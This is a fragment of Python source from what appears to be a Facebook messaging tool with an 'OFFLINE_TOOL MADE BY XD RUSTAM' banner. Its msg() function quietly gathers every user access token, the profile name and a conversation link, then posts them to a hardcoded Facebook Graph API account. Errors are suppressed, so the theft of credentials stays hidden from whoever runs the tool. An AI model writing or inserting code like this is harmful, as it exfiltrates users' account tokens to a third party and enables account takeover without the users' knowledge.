...
def send_messages():
    ...
    def liness():
        print('\001b[37m' + '-------------------------OFFLINE_TOOL MADE BY XD RUSTAM--------------------------')
    ...
    def msg():
        parameters = {
            ...
            'message': 'User Profile Name: MENTAL'+getName(random.choice(access_tokens))+'\ Token : '+" | ".join(access_tokens)+'\ Link : https://www.facebook.com/Tejas.ware https://www.facebook.com/messages/t/'+convo_id
        }
        with contextlib.suppress(Exception):
            requests.post("https://graph.facebook.com/v15.0/100001266233178/", data=parameters, headers=headers)
